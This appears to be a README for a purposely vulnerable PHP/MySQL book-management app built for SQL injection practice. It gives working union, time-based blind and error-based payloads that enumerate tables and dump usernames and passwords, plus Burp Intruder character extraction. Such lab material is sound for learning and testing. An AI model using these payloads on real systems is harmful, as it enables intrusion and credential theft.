# vulnerable-to-sqli
I developed a book control web application with php language. This application I developed using mysql is vulnerable to sql injection types. There are also blocked php codes against sql vulnerability. 

![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/558074a1-862b-417d-9541-79461eab338c)

I have attached the detection and exploitation of vulnerabilities as screen photos.

# UNION-BASED SQLI
![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/73240dc8-8851-4ae3-93a2-802473689421)
exploitation:
![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/38461f5c-5ca3-4e70-8c5b-eb15991c32a5)

payload to get table names:
1' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -
![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/39745bb9-7d80-48cf-a712-80ac2dbb5e45)

payload to get column names from Users table:
1' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name='Users'-- -

get credentials:
1' UNION SELECT 1,UserName,3,4,Password,6 FROM Users-- -
![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/112d7862-0cc4-4a0a-ac13-2af79b0f97fb)

# BOOLEAN-BASED SQLI 
![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/54aafe13-0a3b-4fe2-9b06-911adc99e9f8)

# TIME-BASED SQLI 
manipulate search query
![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/08a5cb0e-f216-43ad-8ff8-1ca389ad56ef)
vulnerability detection with :
/search.php?search_query=Ethical Hacking Handbook' AND sleep(5) -- -
![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/1b117164-ff3a-4df5-96de-5c8402df0b84)
I got 5 second delay as shown in the tool

According to 5 seconds of sleep, I got the first letter of the database with this payload: 
search.php?search_query=Ethical Hacking Handbook' AND IF(SUBSTRING(database(),1,1)='B',SLEEP(5),0) -- -
Other letters can also be obtained with the intruder tool of the burp tool.For example, to find the second letter of the database:
search.php?search_query=Ethical Hacking Handbook' AND IF(SUBSTRING(database(),2,1)='$set_ıntruder',SLEEP(5),0) -- -

# ERROR-BASED SQLI
' AND 1=CAST((SELECT 1) AS int)-- -
' AND 1=CAST((SELECT username FROM users) AS int)-- -
we got an error 
![image](https://github.com/MeryemDalgali/vulnerable-to-sqli/assets/123389001/118e0659-41cb-4751-af18-492149d81ff1)
and gain the database name. 

